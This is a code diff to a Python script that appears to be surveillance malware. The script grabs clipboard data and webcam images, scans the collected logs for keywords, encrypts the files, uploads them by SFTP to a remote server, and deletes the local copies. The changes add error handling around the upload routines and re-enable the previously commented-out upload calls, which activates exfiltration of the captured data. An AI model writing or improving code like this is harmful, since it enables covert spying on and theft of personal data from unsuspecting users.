@@ -51,7 +51,7 @@ def copy_clipboard():
 
             f.write("Clipboard Data: \n" + pasted_data + "\n")
         except:
-            f.write("Clipboard Data could not be retrieved")
+            f.write("Clipboard Data could not be retrieved or Clipboard is empty")
 
 
 # Captures Webcam using cv2 module
@@ -95,30 +95,38 @@ def encrypt_files():
 # Sftp the files to server
 def sftp_files_threat():
     with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
-        print("Connection Successfully Established")
-        sftp.chdir(threat_file)
-        time_str = time.strftime("Threat_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
-        sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
-        print("Directory created")
-        sftp.chdir(time_str)
-        slash = "/"
-        new_path = sftp.pwd
-        sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
-        sftp.close()
+        try:
+            print("Connection Successfully Established")
+            sftp.chdir(threat_file)
+            time_str = time.strftime("Threat_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
+            sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
+            print("Directory created")
+            sftp.chdir(time_str)
+            slash = "/"
+            new_path = sftp.pwd
+            sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
+            sftp.close()
+        except AttributeError as e:
+            print("NO connection", e.__class__, "occurred.")
+            pass
 
 
 def sftp_files_log():
     with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
-        print("Connection Successfully Established")
-        sftp.chdir(remote_file)
-        time_str = time.strftime("Log_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
-        sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
-        print("Directory created")
-        sftp.chdir(time_str)
-        slash = "/"
-        new_path = sftp.pwd
-        sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
-        sftp.close()
+        try:
+            print("Connection Successfully Established")
+            sftp.chdir(remote_file)
+            time_str = time.strftime("Log_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
+            sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
+            print("Directory created")
+            sftp.chdir(time_str)
+            slash = "/"
+            new_path = sftp.pwd
+            sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
+            sftp.close()
+        except AttributeError as e:
+            print("NO connection", e.__class__, "occurred.")
+            pass
 
 
 # Delete files from the local pc or workstation
@@ -145,7 +153,7 @@ def read_file():
                 print("these words were found, storing in Threat Directory")
                 logfiles.close()
                 encrypt_files()
-                # sftp_files_threat()
+                sftp_files_threat()
                 delete_files()
                 print("Encrypted and stored in Threat dir")
                 break
@@ -154,7 +162,7 @@ def read_file():
                 print("no words were found, storing in Log Directory")
                 logfiles.close()
                 encrypt_files()
-                # sftp_files_log()
+                sftp_files_log()
                 delete_files()
                 print("Encrypted and stored in Log dir")
                 break
